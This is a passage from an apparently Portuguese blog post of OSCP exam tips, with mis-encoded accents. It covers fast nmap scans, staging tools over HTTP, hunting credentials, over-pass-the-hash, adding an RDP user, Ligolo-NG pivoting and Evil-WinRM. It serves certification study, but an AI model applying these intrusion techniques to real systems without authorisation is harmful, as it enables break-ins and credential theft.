<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

  <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;üêû&lt;/text&gt;&lt;/svg&gt;">

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>OSCP - Aprendizados&nbsp;|&nbsp;www.offensivethink.com</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="OSCP - Aprendizados">
  
    <meta name="description" content="Algumas dicas e aprendizados ap√≥s a OSCP obtidas em agosto de 2024!">
    <meta property="og:description" content="Algumas dicas e aprendizados ap√≥s a OSCP obtidas em agosto de 2024!">
  
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="index.html">
    <div class="Navbar__Btn">
      
        <span><img class="inline-img-icon" src="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;üêû&lt;/text&gt;&lt;/svg&gt;"></span>&nbsp;
      
      <span>Home</span>
    </div>
  </a>
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
      <span class="Navbar__Delim">&centerdot;</span>
      <a href="referencia-rapida.html">
        <div class="Navbar__Btn">
          
          <span>‚Üí Refer√™ncia r√°pida ‚Üê </span>
        </div>
      </a>
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
      <span class="Navbar__Delim">&centerdot;</span>
      <a href="contacts.html">
        <div class="Navbar__Btn">
          
            <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F12e48681-f6a0-41cb-aa1f-73a46f35c5d3%2FOffensiveThink_Logo_Negative_notion_-_280x280.png?table=block&amp;id=ca933149-5245-4511-a885-9cf5922808e1"></span>&nbsp;
          
          <span>about &amp; contacts</span>
        </div>
      </a>
    
  
    
      <span class="Navbar__Delim">&centerdot;</span>
      <a href="offensivetools.html">
        <div class="Navbar__Btn">
          
          <span>Offensive Tools</span>
        </div>
      </a>
    
  
    
  
    
  
    
  
</nav>
  <header class="Header">
    
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
    <h1 class="Header__Title">OSCP - Aprendizados</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Thu, Aug 22, 2024</span>
        
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
            <a href="tag/certifications.html">certifications</a>
          </span>
        
      </div>
    
  </header>
  <article id="https://www.notion.so/068520793e1e49b89fcabd67747003cc" class="PageRoot"><div id="https://www.notion.so/19748c3558d543d1ad1f0833bde0fe85" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/191443cc36c24d8da2c50964a6a62d35" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F0bef1bfc-13f9-4c8f-b54c-0af0ed716655%2F425f9052-18ae-4b55-9fc4-799da3f10d60%2F2024-08-23_11_47_17-Credential_Renderer.png?width=1060&amp;table=block&amp;id=191443cc-36c2-4d8d-a2c5-0964a6a62d35"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F0bef1bfc-13f9-4c8f-b54c-0af0ed716655%2F425f9052-18ae-4b55-9fc4-799da3f10d60%2F2024-08-23_11_47_17-Credential_Renderer.png?width=1060&amp;table=block&amp;id=191443cc-36c2-4d8d-a2c5-0964a6a62d35" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><h1 id="https://www.notion.so/cf578463654e4d58a5e800f329a9a439" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/cf578463654e4d58a5e800f329a9a439"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">INTRO</span></span></h1><div id="https://www.notion.so/f217cd26c1f04f78ad7ca189defdfe2f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/57ef30af7ad54766bbda4e78f51920dc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Muitas postagens s√£o no sentido de detalhar o dia a dia da prova, o que usou para estudo, como √© a prova, etc. Entendo que estes ajudam tamb√©m, mas essa n√£o √© minha inten√ß√£o, mas sim, relatar algumas experi√™ncias de forma direta que podem ajudar a quem est√° buscando esta certifica√ß√£o.</span></span></p></div><div id="https://www.notion.so/ae41293e290f40e382925e2e18b471ed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Para mim, como todo curso, toda certifica√ß√£o, mesmo que seja sobre um assunto que voc√™ acha que j√° sabe, sempre haver√° o que aprender! Nem que seja um jeito novo de fazer a mesma coisa! </span></span></p></div><h1 id="https://www.notion.so/831174c6bee2422fb53c585efd996b46" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/831174c6bee2422fb53c585efd996b46"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">SOBRE A CERTIFICA√á√ÉO</span></span></h1><div id="https://www.notion.so/a8a3340ac59c46ad94e130ba5d9cf056" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/33bdc266d7944700b321dff735c03978" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Hoje eu possuo certifica√ß√µes da EC COUNCIL (CEH v10 ANSI e PRACTICAL) , da Offensive Security ( OSCE, OSCP ) e da INE( eWPT, eCPPTv2 ).</span></span></p></div><div id="https://www.notion.so/0a5f0c2ad1f743eb993eedbb6c450eb3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Gosto bastante das certifica√ß√µes da INE (antiga eLeansecurity) por elas serem mais pr√≥ximas de um trabalho real de um pentest do que um CTF/Desafio onde se busca provar que conseguiu determinado objetivo atrav√©s de flags.</span></span></p></div><div id="https://www.notion.so/5c56e18067c941ba9edfd12ddbbef7aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">J√° as certifica√ß√µes da Offensive Security s√£o conhecidas pelo tempo restrito e pelo bord√£o Try Harder. </span></span></p></div><div id="https://www.notion.so/98dc7c08687241dbad348b4ee0eaa233" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Esse √© um ponto interessante e sempre muito debatido pois se pensarmos bem acho que n√£o seremos contratados para nenhum pentest onde lhe dar√£o 24h para invadir. Nesse ponto, as certifica√ß√µes da INE s√£o muito mais realistas. Mas h√° um ponto ai. Quando voc√™ √© ‚Äúchamado‚Äù para executar uma tarefa de uma certa dificuldade e sabe que o tempo √© bem restrito, o seu c√©rebro trata de fazer voc√™ focar e prestar aten√ß√£o, pois sem isso, voc√™ n√£o alcan√ßar√° o objetivo. E voc√™ descobrir√° pelo bem ou pelo mal que voc√™ deve se planejar, antever, se preparar. O dia da prova de certifica√ß√£o √© o dia do Ataque.  </span></span></p></div><div id="https://www.notion.so/2ca58b0c9aad43e7b17eda138f9cac2d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h1 id="https://www.notion.so/50fef4370c8c40ac8b9f246382f5ba3d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/50fef4370c8c40ac8b9f246382f5ba3d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">ANTES DE MAIS NADA</span></span></h1><div id="https://www.notion.so/bd908913ad8f4ac1a288f77ebac65dfe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Desenvolvi um simples webserver em python para me ajudar nessa jornada. O problema que eu queria resolver era: Precisava de um webserver simples como rodar </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">python3 -m http.server</code></span><span class="SemanticString"> mas que n√£o ligasse se o nome do que eu precisava estava em mai√∫scula ou min√∫scula e que tamb√©m aceitasse upload de arquivo para eu n√£o ter que ficar me preocupando em mandar por FTP, SMB, etc. Vai que existia algum firewall e quase toda m√°quina est√° liberado o acesso a porta 80 ao menos. </span></span></p></div><div id="https://www.notion.so/e6703b2e3c2843a0b4ceb72fdb53a269" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Ent√£o fica a dica de baixar e usar ‚Üí  </span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown">‚Ä£</span></span></span></p></div><h1 id="https://www.notion.so/95b171e96f024985861fa969013f3361" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/95b171e96f024985861fa969013f3361"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">MINHAS RECOMENDA√á√ïES</span></span></h1><div id="https://www.notion.so/c799c15165c94a7e97c1d4669f0749c6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"> </span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/f3dd046b7f8041289e167bf9d5682f92" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Antes de tudo, lembre-se! As m√°quinas s√£o vulner√°veis! Voc√™ consegue!  Isso n√£o √© um pentest que voc√™ far√° e pode ou n√£o encontrar uma vulnerabilidade! Ela existe, √© explor√°vel e existe exploit p√∫blico! </span></span></li><li id="https://www.notion.so/e056e10a72cc4ad39d425d0e5737a10d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Se trata de Enxergar e n√£o simplesmente olhar! Quem olha v√™ s√≥ metade! Esteja atento a tudo! O titulo do site que voc√™ as vezes nem presta aten√ß√£o! A resposta de um GET que vem com um cabe√ßalho que lhe dar alguma pista! Enxergue! </span></span></li><li id="https://www.notion.so/18b809642ed1418eb96d45b951c1ac0d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Expanda a mente. Invadir um sistema n√£o acontece s√≥ porque existe uma falha no software e com isso tem um exploit p√∫blico! Voc√™ pode invadir um sistema, uma m√°quina, simplesmente porque achou uma credencial de acesso! Lembre-se disso! </span></span></li><li id="https://www.notion.so/15b1e9d1594944a09247f8f174042093" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Essa √© uma certifica√ß√£o que tem um tempo restrito e eles sabem disso. Pediram em algum momento do curso para voc√™ usar uma m√°quina windows com visual studio para compilar aquele exploit que s√≥ existe em c√≥digo fonte? Ent√£o! Se voc√™ est√° indo para esse lado, volte.    </span></span></li><li id="https://www.notion.so/7b31254df26749a081799af2e6aac0ff" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">√â uma prova, n√£o um exerc√≠cio de red team, logo n√£o tem que ser stealthy, use a abuse das op√ß√µes </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-T5</code></span><span class="SemanticString">  </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">--min-rate 2000</code></span><span class="SemanticString"> do nmap.</span></span></li><li id="https://www.notion.so/9d6b461fceb343eeb2d8a3a0ae9f2b7b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Se prepare. E isso n√£o tem a ver com todas as recomenda√ß√µes que voc√™ vai encontrar aos montes ai de resolver m√°quinas XYZ, fazer laborat√≥rios, etc.  Sim, isso √© v√°lido, mas aqui estou falando de preparar seu ambiente. Se voc√™ fosse convocado para uma guerra voc√™ levantaria da cadeira e iria de short e sand√°lia? Imagino que n√£o. E isso √© uma guerra! Logo, se prepare. Voc√™ tem pouco tempo para procurar! </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Crie um Plano de Ataque!</strong></span></span><ul class="BulletedListWrapper"><li id="https://www.notion.so/7c9acc9879fb4a97b7ce2bbd2a4ebf3c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Que ferramentas voc√™ acha que vai usar? Baixe e instale. </span></span></li><li id="https://www.notion.so/358ed957cdc94f56b028aff053ceadb9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Quais exploits voc√™ acha que poder√° ser √∫til para privesc linux, windows? Potatos? Baixe todas as batatas!</span></span></li><li id="https://www.notion.so/204ab6d248884902a69f72acad6308e8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Que wordlists voc√™ espera usar ? Saiba onde est√£o. Anote.</span></span></li><li id="https://www.notion.so/9cfce54dc00c4ca292001a0f6d461402" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Acha que d√° para automatizar alguma coisa? Automatize. </span></span></li><li id="https://www.notion.so/d76c808561f9456bb89cab9798ca6227" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Se achar um zip com senha , sabe quebrar? se achar um arquivo do keepass sabe quebrar? se achar um passwd e um shadow, sabe quebrar a senha do usu√°rio? Pense nas possibilidades, instale as ferramentas necess√°rias e deixe anotado como fazer caso precise!</span></span></li><li id="https://www.notion.so/0a88309e93f9458f827ac4bb74e7653c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Que sites com cheatsheets voc√™ acha interessante? Gtfobin (</span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></span><span class="SemanticString">) ? Lolbas (</span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></span><span class="SemanticString">) ? revshells ( </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></span><span class="SemanticString"> )? Deixa tudo aberto no navegar no seu host!</span></span></li><li id="https://www.notion.so/ba1245275fb14f6fbb3c8836bc86f61c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Qual ferramenta vai usar assim que receber o ambiente? nmap? autorecon (</span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/Tib3rius/AutoRecon">https://github.com/Tib3rius/AutoRecon</a></span><span class="SemanticString">)? osixtyone para snmp? Anota os comandos para copy paste.  </span></span></li><li id="https://www.notion.so/9aeb127e5ddb46d2943c910df7b7786c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Precisa mesmo esperar a ferramenta lhe dizer que existe para s√≥ ent√£o atacar? Voc√™ vai ser castigado por tentar acessar um site na porta 80 e ele n√£o existir? N√£o? Ent√£o teste logo. Por exemplo, o SNMP se acess√≠vel pode lhe dar informa√ß√µes valiosas da m√°quina. Testa logo imaginando que t√° aberto. No m√°ximo voc√™ n√£o vai conseguir e partir pra outra. </span></span></li><li id="https://www.notion.so/e09e09697c444149b9d86f2c10dae1ee" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"> Baixe tudo e mais um pouco do que precisa e que n√£o precisa. Coloque tudo em um diret√≥rio ( </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">~/tools</code></span><span class="SemanticString"> por exemplo) e deixe ele dispon√≠vel via web (</span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/diegoalbuquerque/offensivewebserver">https://github.com/diegoalbuquerque/offensivewebserver</a></span><span class="SemanticString">) </span></span></li><li id="https://www.notion.so/06c507d892224651849f3c7d8b1908e2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Deixa tudo preparado: M√°quina Linux, que ferramentas voc√™ espera usar para ajudar √† escalar privil√©gios? M√°quina windows standalone, quais? M√°quina windows em dom√≠nio, sharphound, powerview? </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Entrou na m√°quina, leva tudo pra dentro</strong></span><span class="SemanticString">. Deixa anotado no plano: COPY e PASTE de comandos! </span></span><ul class="BulletedListWrapper"><li id="https://www.notion.so/72bd0e08791c407aa73a1377f0a751ef" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">M√°quina linux: Copia para </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/tmp</code></span><span class="SemanticString"> </span></span></li><li id="https://www.notion.so/f3bb3764b3944b7ebe473e0c87761268" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">M√°quina windows: Copia para </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">c:\users\public</code></span></span></li></ul></li></ul></li><li id="https://www.notion.so/f51e17c2969d4f1a93c2d97a55f20513" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Escalar privil√©gio n√£o quer dizer sair de um usu√°rio simples direto para root ou domain admin, que seja. Escalar privil√©gio √© obter mais privil√©gios do que voc√™ j√° tem, que pode ser simplesmente indo para outro usu√°rio! </span></span><ul class="BulletedListWrapper"><li id="https://www.notion.so/ccd14b06707545e5b0e82ed9b4fd90d9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Aqui vale uma ressalva muito importante!</strong></mark></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorDefault"> Voc√™ pode escalar privil√©gio simplesmente por achar na m√°quina a senha de um outro usu√°rio ou mesmo do root, por exemplo, porque foi colocada dentro de um script de automatiza√ß√£o! N√£o obrigatoriamente ser√° por uma vulnerabilidade! </mark></span></span></li><li id="https://www.notion.so/9881c150d9ce4dcfb82bc028b8cf73d0" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Outra ponto de aten√ß√£o!</strong></mark></span><span class="SemanticString"> Existe uma coisa no mundo chamada Hardening e mitiga√ß√£o! Cuidado. Voc√™ pode ver uma vulnerabilidade, o software ou kernel est√° na vers√£o correta, mas n√£o ser explor√°vel porque foi mitigado! O caminho pode ser outro e deixaram ali de prop√≥sito s√≥ pra voc√™ ficar batendo cabe√ßa por horas tentando fazer funcionar algo que n√£o vai funcionar nunca! </span></span></li></ul></li><li id="https://www.notion.so/c6bbf58aa8e8420781532b90560c8914" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Invadiu uma m√°quina windows do dom√≠nio? Qual √© seu usu√°rio? √â um usu√°rio local? Lembre-se, com usu√°rio local voc√™ n√£o acessa o dom√≠nio, logo n√£o tem como usar powerview, etc. Precisa comprometer um usu√°rio do dom√≠nio para ter acesso ao dom√≠nio.</span></span><ul class="BulletedListWrapper"><li id="https://www.notion.so/147ed57adca846babff0dee92d820aad" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Ops! Um detalhe. Pode ser que seu usu√°rio n√£o seja do dom√≠nio, mas a sua m√°quina esteja no dom√≠nio e uma m√°quina no dom√≠nio tem um HASH no LSASS, que pode ser usado para OVER-PASS-THE-HASH e consultar o dom√≠nio!!! </span></span></li></ul></li><li id="https://www.notion.so/bdc02dcfe2314f85bb202f098bb72477" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Vasculhe! Vasculhe! Vasculhe! Tem algum software diferente instalado? Olhe. Veja as pastas, o que tem dentro delas, dentro dos arquivos. Existem scripts na raiz? Existe um arquivo que aparentemente n√£o faz nada? N√£o olhe, enxergue!  As vezes algo pode ser usado como uma credencial, uma senha para um password spray.</span></span></li><li id="https://www.notion.so/bafac09d1ba44c29b306441d74ce5af4" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">N√£o obrigatoriamente voc√™ precisa criar um shell reverso ou mesmo ficar em um shell sem muita interatividade. Crie um usu√°rio e coloque-o no grupo que permite RDP e fa√ßa RDP! </span></span></li><li id="https://www.notion.so/6d17bf603b16449ea1eb0a832b003697" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Voc√™ vai precisar pivotear pois j√° √© esperado isso. Aprendar a usar o Ligolo-NG. √â f√°cil demais e uma m√£o na roda. Abaixo eu coloco um passo a passo que deixei anotado (plano de ataque, lembra!) e que usei! </span></span></li><li id="https://www.notion.so/e87a1bee18354c5e85712714e850fe7f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Nem sempre o ponto de entrada est√° a olhos vistos! As vezes voc√™ pode encontrar um site web dispon√≠vel mas n√£o ter nenhuma vulnerabilidade. Quase sempre, se voc√™ encontrar um site que parece ser apenas um template de site, j√° imagine que ali n√£o tem nada, mas pode ter algo escondido em outro diret√≥rio!  Enumere! Lembre-se, um site pode ter uma p√°gina de administra√ß√£o e que n√£o vai t√° de cara no robots.txt, ela simplesmente n√£o √© conhecida publicamente, mas se voc√™ enumerar vai achar! </span></span><ul class="BulletedListWrapper"><li id="https://www.notion.so/771b30b6bf144e38b63f656eb31f85d1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Achou uma tela de login. N√£o, n√£o obrigatoriamente voc√™ vai entrar porque tem um SQL Injection, etc. J√° pensou em simplesmente acessar usando credencial default ? Qual √© o sistema? Procure no google pelas credenciais default! </span></span></li><li id="https://www.notion.so/a5f05c342f2641beba8b9038c5ecefc7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Vai enumerar! Seja efetivo! Voc√™ tem pouco tempo. A m√°quina √© um Windows? Ela √© case insensitive, ou seja, index.html √© o mesmo que INDEX.html. Para que testar duas vezes? Crie ou j√° d√™ um jeito de filtrar das wordlists, termos duplicados e em caso de windows, transforme tudo em min√∫scula. ( </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cat wordlist | sort -fu &gt; wordlist-case-insensitive</code></span><span class="SemanticString"> )</span></span><ul class="BulletedListWrapper"><li id="https://www.notion.so/a6da4ac6659647f9987c16a1c58f3888" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">O nmap ou algo do tipo n√£o disse se √© windows ou linux? Vamos dizer que </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">index.html</code></span><span class="SemanticString"> seja uma p√°gina v√°lida.  Testa </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">http://site/index.html</code></span><span class="SemanticString">  e </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">http://site/inDeX.html</code></span><span class="SemanticString"> . Se der a mesma coisa √© windows, afinal, tanto faz pro windows mai√∫scula como min√∫scula e dificilmente algu√©m vai ter criado a mesma vers√£o da p√°gina variando letras assim.</span></span></li></ul></li></ul></li><li id="https://www.notion.so/cbbdd44dedf84c27ba020e14c537ee77" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Experi√™ncias pessoais, s√£o experi√™ncias pessoais. Sempre bom lembrar que as experi√™ncias de cada um tem influ√™ncia direta no quanto e como cada um estudou para obter a certifica√ß√£o.  Leve isso em conta.  Pense se voc√™ tem dom√≠nio ou n√£o sobre os assuntos cobrados na certifica√ß√£o. </span></span></li><li id="https://www.notion.so/49cf2a9b40a4463692a04626c657527a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorBlue"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">&gt;&gt;&gt;</strong></mark></span><span class="SemanticString"> </span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">DOCUMENTE seu passo a passo!</strong></mark></span><span class="SemanticString"> </span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorBlue"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">&lt;&lt;&lt;</strong></mark></span><span class="SemanticString"> Fa√ßa um passo a passo de todos os comandos usados para comprometer uma m√°quina e depois escalar privil√©gios. Caso voc√™ precise come√ßar do zero (reiniciar seu kali, reverter m√°quina, etc.) voc√™ voltar√° ao estado atual rapidamente. </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"> Inclusive, coloque isso no seu relat√≥rio para cada m√°quina! </strong></span></span></li><li id="https://www.notion.so/fec09b0554e242388df89b05fa7940e0" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Nem tudo √© Reverse Shell! Invadiu a primeira m√°quina que d√° acesso ao ambiente AD, criou um t√∫nel atrav√©s dela usando o Ligolo-NG, conseguiu invadir a m√°quina interna e ai precisa que essa m√°quina interna use alguma ferramenta que voc√™ tem no seu kali (em </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">~/tools</code></span><span class="SemanticString"> por exemplo), ou mesmo voc√™ quer um shell nela, n√£o obrigatoriamente voc√™ precisa percorrer o caminho inverso!!! </span></span><ul class="BulletedListWrapper"><li id="https://www.notion.so/82e72f9681d3426cbfe5f50a323536c1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Se voc√™ tem uma credencial de acesso aquela m√°quina, pode ser que voc√™ consiga acess√°-la diretamente usando um </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Evil-WinRM</code></span><span class="SemanticString"> com uma credencial e fazer upload do arquivo por ele! </span></span></li></ul></li></ul><div id="https://www.notion.so/48583018e72843fe91266eae570ae6af" 